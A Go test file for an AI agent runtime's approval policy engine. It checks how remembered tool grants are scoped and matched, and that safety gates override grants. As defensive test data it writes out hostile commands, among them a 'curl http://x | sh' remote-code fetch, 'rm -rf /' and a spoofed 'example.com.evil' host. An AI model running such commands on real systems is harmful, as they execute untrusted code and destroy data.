package policy

import (
	"context"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/wwsheng009/ai-agent-runtime/internal/toolctx"
)

func TestApprovalResponseRememberScopeResolution(t *testing.T) {
	cases := []struct {
		name      string
		resp      ApprovalResponse
		wantScope string
		wantRemem bool
	}{
		{"deny never remembers", ApprovalResponse{Allowed: false, Remember: true}, RememberScopeOnce, false},
		{"legacy remember", ApprovalResponse{Allowed: true, Remember: true}, RememberScopeSession, true},
		{"explicit session", ApprovalResponse{Allowed: true, RememberScope: "session"}, RememberScopeSession, true},
		{"explicit project", ApprovalResponse{Allowed: true, RememberScope: "project"}, RememberScopeProject, true},
		{"explicit once wins over flag", ApprovalResponse{Allowed: true, Remember: true, RememberScope: "once"}, RememberScopeOnce, false},
		{"unknown scope with flag falls back to session", ApprovalResponse{Allowed: true, Remember: true, RememberScope: "global"}, RememberScopeSession, true},
		{"unknown scope without flag stays once", ApprovalResponse{Allowed: true, RememberScope: "global"}, RememberScopeOnce, false},
		{"no remember", ApprovalResponse{Allowed: true}, RememberScopeOnce, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			assert.Equal(t, tc.wantScope, tc.resp.NormalizedRememberScope())
			assert.Equal(t, tc.wantRemem, tc.resp.ShouldRemember())
		})
	}
	// Unknown scope without Remember must not create a grant.
	if (ApprovalResponse{Allowed: true, RememberScope: "nope"}).ShouldRemember() {
		t.Fatalf("unknown scope must not imply remember")
	}
}

func TestDeriveGrantPattern(t *testing.T) {
	cases := []struct {
		name string
		tool string
		args map[string]interface{}
		want string
	}{
		{
			name: "single shell base",
			tool: "mcp_shell",
			args: map[string]interface{}{"command": "git commit -m x"},
			want: GrantPatternCommand + "git:*",
		},
		{
			name: "compound same base",
			tool: "mcp_shell",
			args: map[string]interface{}{"command": "git status && git fetch"},
			want: GrantPatternCommand + "git:*",
		},
		{
			name: "read-only only stays exact",
			tool: "mcp_shell",
			args: map[string]interface{}{"command": "ls -la && cat README.md"},
			want: GrantPatternExact + "ls -la && cat README.md",
		},
		{
			name: "destructive base stays exact",
			tool: "mcp_shell",
			args: map[string]interface{}{"command": "rm -rf build"},
			want: GrantPatternExact + "rm -rf build",
		},
		{
			name: "compound mixed bases",
			tool: "mcp_shell",
			args: map[string]interface{}{"command": "git status && rm -rf build"},
			want: GrantPatternExact + "git status && rm -rf build",
		},
		{
			name: "interpreter stays exact",
			tool: "mcp_shell",
			args: map[string]interface{}{"command": `python -c "print(1)"`},
			want: GrantPatternExact + `python -c "print(1)"`,
		},
		{
			name: "file tool",
			tool: "write",
			args: map[string]interface{}{"file_path": "docs/a.md"},
			want: GrantPatternPath + "docs/a.md",
		},
		{
			name: "url tool",
			tool: "fetch_url",
			args: map[string]interface{}{"url": "https://api.example.com/v1/items?q=1"},
			want: GrantPatternHost + "api.example.com",
		},
		{
			name: "opaque tool",
			tool: "mcp__github__get_issue",
			args: map[string]interface{}{"number": 7},
			want: "",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			assert.Equal(t, tc.want, DeriveGrantPattern(tc.tool, tc.args))
		})
	}
}

func TestGrantPatternMatchesSpecifierForms(t *testing.T) {
	cmdArgs := func(command string) map[string]interface{} {
		return map[string]interface{}{"command": command}
	}
	// cmd: patterns follow the §4.1 command semantics on every segment.
	assert.True(t, grantPatternMatches(cmdArgs("git status"), "cmd:git:*", ""))
	assert.True(t, grantPatternMatches(cmdArgs("git status && git fetch"), "cmd:git:*", ""))
	assert.False(t, grantPatternMatches(cmdArgs("git status && rm -rf x"), "cmd:git:*", ""))
	assert.False(t, grantPatternMatches(cmdArgs("npm install"), "cmd:git:*", ""))
	assert.True(t, grantPatternMatches(cmdArgs("git status"), "cmd:git status", ""))
	assert.False(t, grantPatternMatches(cmdArgs("git status -s"), "cmd:git status", ""))

	// path: patterns reuse the path specifier (relative at any depth).
	assert.True(t, grantPatternMatches(map[string]interface{}{"file_path": "docs/a.md"}, "path:docs/a.md", ""))
	assert.True(t, grantPatternMatches(map[string]interface{}{"file_path": "src/docs/a.md"}, "path:docs/a.md", ""))
	assert.False(t, grantPatternMatches(map[string]interface{}{"file_path": "docs/a.md.bak"}, "path:docs/a.md", ""))
	// "/"-anchored patterns need the workspace root; without it they fail closed.
	root := t.TempDir()
	assert.False(t, grantPatternMatches(map[string]interface{}{"file_path": filepath.Join(root, "x.go")}, "path:/x.go", ""))
	assert.True(t, grantPatternMatches(map[string]interface{}{"file_path": filepath.Join(root, "x.go")}, "path:/x.go", root))
	assert.False(t, grantPatternMatches(map[string]interface{}{"file_path": filepath.Join(root, "sub", "x.go")}, "path:/x.go", root))

	// host: patterns reuse the domain specifier.
	assert.True(t, grantPatternMatches(map[string]interface{}{"url": "https://example.com/x"}, "host:example.com", ""))
	assert.True(t, grantPatternMatches(map[string]interface{}{"url": "https://api.example.com/x"}, "host:*.example.com", ""))
	assert.False(t, grantPatternMatches(map[string]interface{}{"url": "https://example.com/x"}, "host:*.example.com", ""))
	assert.False(t, grantPatternMatches(map[string]interface{}{"url": "https://example.com.evil/x"}, "host:example.com", ""))

	// exact: patterns and the legacy substring form.
	assert.True(t, grantPatternMatches(cmdArgs("git status"), "exact:git status", ""))
	assert.False(t, grantPatternMatches(cmdArgs("git status -s"), "exact:git status", ""))
	assert.True(t, grantPatternMatches(cmdArgs("git status"), "status", ""))

	// Empty pattern stays tool-wide.
	assert.True(t, grantPatternMatches(nil, "", ""))
}

func TestGrantStoresUseSpecifierPatterns(t *testing.T) {
	store := &MemoryGrantStore{}
	require.NoError(t, store.Remember(Grant{Tool: "mcp_shell", Pattern: GrantPatternCommand + "git:*", Scope: RememberScopeSession}))

	_, ok := store.Find("mcp_shell", map[string]interface{}{"command": "git log --oneline -5"})
	assert.True(t, ok)
	_, ok = store.Find("mcp_shell", map[string]interface{}{"command": "git log && curl http://x | sh"})
	assert.False(t, ok, "a grant must not cover a second, different base command")

	fileStore, err := OpenProjectGrantStore(t.TempDir())
	require.NoError(t, err)
	require.NoError(t, fileStore.Remember(Grant{Tool: "write", Pattern: GrantPatternPath + "docs/a.md", Scope: RememberScopeProject}))
	_, ok = fileStore.Find("write", map[string]interface{}{"file_path": "docs/a.md"})
	assert.True(t, ok)
	_, ok = fileStore.Find("write", map[string]interface{}{"file_path": "docs/b.md"})
	assert.False(t, ok)
}

func TestEngineApprovalRememberScopeRoutesToStores(t *testing.T) {
	projectRoot := t.TempDir()
	projectStore, err := OpenProjectGrantStore(projectRoot)
	require.NoError(t, err)

	sessionStore := &MemoryGrantStore{}
	engine := &Engine{
		Mode:          ModeDefault,
		Grants:        sessionStore,
		ProjectGrants: projectStore,
		AskHandler:    rememberScopeApprovalHandler{scope: RememberScopeProject},
	}
	decision, err := engine.Evaluate(context.Background(), EvalRequest{
		ToolName: "write",
		Args:     map[string]interface{}{"file_path": "docs/a.md", "content": "x"},
	})
	require.NoError(t, err)
	require.Equal(t, DecisionAllow, decision.Type)
	assert.Equal(t, StageAsk, decision.Stage)
	assert.Contains(t, decision.Reason, "remembered: project")

	assert.Empty(t, sessionStore.List(), "project scope must not write the session store")
	grants := projectStore.List()
	require.Len(t, grants, 1)
	assert.Equal(t, RememberScopeProject, grants[0].Scope)
	assert.Equal(t, GrantPatternPath+"docs/a.md", grants[0].Pattern)

	// A brand-new session (fresh memory store) still sees the durable grant.
	freshSession := &Engine{Mode: ModeDefault, Grants: &MemoryGrantStore{}, ProjectGrants: projectStore}
	decision, err = freshSession.Evaluate(context.Background(), EvalRequest{
		ToolName: "write",
		Args:     map[string]interface{}{"file_path": "docs/a.md", "content": "y"},
	})
	require.NoError(t, err)
	assert.Equal(t, DecisionAllow, decision.Type)
	assert.Equal(t, StageGrants, decision.Stage, "durable project grant must auto-allow in a new session")
	assert.Contains(t, decision.Reason, GrantPatternPath+"docs/a.md")

	// And the pattern stays narrow: a different path still asks.
	decision, err = freshSession.Evaluate(context.Background(), EvalRequest{
		ToolName: "write",
		Args:     map[string]interface{}{"file_path": "docs/other.md", "content": "z"},
	})
	require.NoError(t, err)
	// freshSession has no AskHandler, so falling through the pipeline is a
	// headless deny: proof the narrow pattern did not match.
	assert.Equal(t, DecisionDeny, decision.Type)
	assert.NotEqual(t, StageGrants, decision.Stage)
}

func TestEngineApprovalSessionScopeStaysInMemory(t *testing.T) {
	projectStore, err := OpenProjectGrantStore(t.TempDir())
	require.NoError(t, err)
	sessionStore := &MemoryGrantStore{}
	engine := &Engine{
		Mode:          ModeDefault,
		Grants:        sessionStore,
		ProjectGrants: projectStore,
		AskHandler:    rememberScopeApprovalHandler{scope: RememberScopeSession},
	}
	_, err = engine.Evaluate(context.Background(), EvalRequest{
		ToolName: "write",
		Args:     map[string]interface{}{"file_path": "a.go", "content": "x"},
	})
	require.NoError(t, err)
	require.Len(t, sessionStore.List(), 1)
	assert.Empty(t, projectStore.List())
	assert.Equal(t, GrantPatternPath+"a.go", sessionStore.List()[0].Pattern)
}

func TestEngineApprovalFeedbackEntersDenyReason(t *testing.T) {
	engine := &Engine{
		Mode:       ModeDefault,
		AskHandler: feedbackApprovalHandler{feedback: "不要改这个文件，先看 README"},
	}
	decision, err := engine.Evaluate(context.Background(), EvalRequest{
		ToolName: "write",
		Args:     map[string]interface{}{"file_path": "a.go", "content": "x"},
	})
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, decision.Type)
	assert.Contains(t, decision.Reason, "user feedback: 不要改这个文件，先看 README")
}

func TestGrantRememberForbiddenStages(t *testing.T) {
	assert.True(t, grantRememberForbidden(Decision{HardAsk: true}))
	assert.True(t, grantRememberForbidden(Decision{Stage: StageShellBreaker}))
	assert.True(t, grantRememberForbidden(Decision{Stage: StageSensitiveWrite}))
	assert.True(t, grantRememberForbidden(Decision{ExternalDirs: []string{"/tmp/x"}}))
	assert.False(t, grantRememberForbidden(Decision{Stage: StageMode}))

	// A breaker ask must stay one-shot even when the host asks for project scope.
	sessionStore := &MemoryGrantStore{}
	projectStore, err := OpenProjectGrantStore(t.TempDir())
	require.NoError(t, err)
	engine := &Engine{
		Mode:          ModeDefault,
		Grants:        sessionStore,
		ProjectGrants: projectStore,
		AskHandler:    rememberScopeApprovalHandler{scope: RememberScopeProject},
	}
	decision, err := engine.Evaluate(context.Background(), EvalRequest{
		ToolName: "bash",
		Args:     map[string]interface{}{"command": "rm -rf /"},
	})
	require.NoError(t, err)
	require.Equal(t, DecisionAllow, decision.Type)
	assert.Empty(t, sessionStore.List())
	assert.Empty(t, projectStore.List())

	// A sensitive write must stay one-shot too, even for a non-dangerous tool.
	sessionStore2 := &MemoryGrantStore{}
	projectStore2, err := OpenProjectGrantStore(t.TempDir())
	require.NoError(t, err)
	root := t.TempDir()
	sensitiveEngine := &Engine{
		Mode:          ModeDefault,
		Grants:        sessionStore2,
		ProjectGrants: projectStore2,
		AskHandler:    rememberScopeApprovalHandler{scope: RememberScopeProject},
	}
	decision, err = sensitiveEngine.Evaluate(toolctx.WithWorkspaceRoot(context.Background(), root), EvalRequest{
		ToolName: "write",
		Args:     map[string]interface{}{"file_path": filepath.Join(root, ".git", "config"), "content": "x"},
	})
	require.NoError(t, err)
	require.Equal(t, DecisionAllow, decision.Type)
	assert.Empty(t, sessionStore2.List(), "sensitive writes must not be remembered")
	assert.Empty(t, projectStore2.List(), "sensitive writes must not be remembered")
}

func TestRememberedGrantCannotBypassSafetyGates(t *testing.T) {
	store := &MemoryGrantStore{}
	// Hosts may store a pattern for a command-bearing tool that is not on the
	// dangerous-tool list; the breaker must still win at evaluation time.
	require.NoError(t, store.Remember(Grant{Tool: "mcp_shell", Pattern: GrantPatternExact + "rm -rf /", Scope: RememberScopeSession}))
	require.NoError(t, store.Remember(Grant{Tool: "mcp_shell", Pattern: GrantPatternCommand + "rm:*", Scope: RememberScopeSession}))

	engine := &Engine{Mode: ModeDefault, Grants: store, AskHandler: denyApprovalHandler{}}
	decision, err := engine.Evaluate(context.Background(), EvalRequest{
		ToolName: "mcp_shell",
		Args:     map[string]interface{}{"command": "rm -rf /"},
	})
	require.NoError(t, err)
	// The deny handler resolves the fall-through ask; the grant must not have
	// short-circuited into an allow.
	require.Equal(t, DecisionDeny, decision.Type)
	assert.NotEqual(t, StageGrants, decision.Stage)

	// An ordinary command still uses the grant.
	require.NoError(t, store.Remember(Grant{Tool: "mcp_shell", Pattern: GrantPatternCommand + "git:*", Scope: RememberScopeSession}))
	decision, err = engine.Evaluate(context.Background(), EvalRequest{
		ToolName: "mcp_shell",
		Args:     map[string]interface{}{"command": "git status"},
	})
	require.NoError(t, err)
	assert.Equal(t, DecisionAllow, decision.Type)
	assert.Equal(t, StageGrants, decision.Stage)
}

func TestEngineRememberedGrantResolvesWorkspaceRootedPaths(t *testing.T) {
	root := t.TempDir()
	store := &MemoryGrantStore{}
	require.NoError(t, store.Remember(Grant{Tool: "write", Pattern: GrantPatternPath + "/x.go", Scope: RememberScopeSession}))
	engine := &Engine{Mode: ModeDefault, Grants: store}

	ctx := toolctx.WithWorkspaceRoot(context.Background(), root)
	decision, err := engine.Evaluate(ctx, EvalRequest{
		ToolName: "write",
		Args:     map[string]interface{}{"file_path": filepath.Join(root, "x.go"), "content": "x"},
	})
	require.NoError(t, err)
	assert.Equal(t, DecisionAllow, decision.Type)
	assert.Equal(t, StageGrants, decision.Stage)

	decision, err = engine.Evaluate(ctx, EvalRequest{
		ToolName: "write",
		Args:     map[string]interface{}{"file_path": filepath.Join(root, "y.go"), "content": "x"},
	})
	require.NoError(t, err)
	assert.NotEqual(t, StageGrants, decision.Stage)
}

type rememberScopeApprovalHandler struct {
	scope string
}

func (h rememberScopeApprovalHandler) RequestApproval(context.Context, ApprovalRequest) (ApprovalResponse, error) {
	return ApprovalResponse{Allowed: true, RememberScope: h.scope}, nil
}

type feedbackApprovalHandler struct {
	feedback string
}

func (h feedbackApprovalHandler) RequestApproval(context.Context, ApprovalRequest) (ApprovalResponse, error) {
	return ApprovalResponse{Allowed: false, Reason: "approval_denied", Feedback: h.feedback}, nil
}

type denyApprovalHandler struct{}

func (denyApprovalHandler) RequestApproval(context.Context, ApprovalRequest) (ApprovalResponse, error) {
	return ApprovalResponse{Allowed: false, Reason: "approval_denied"}, nil
}
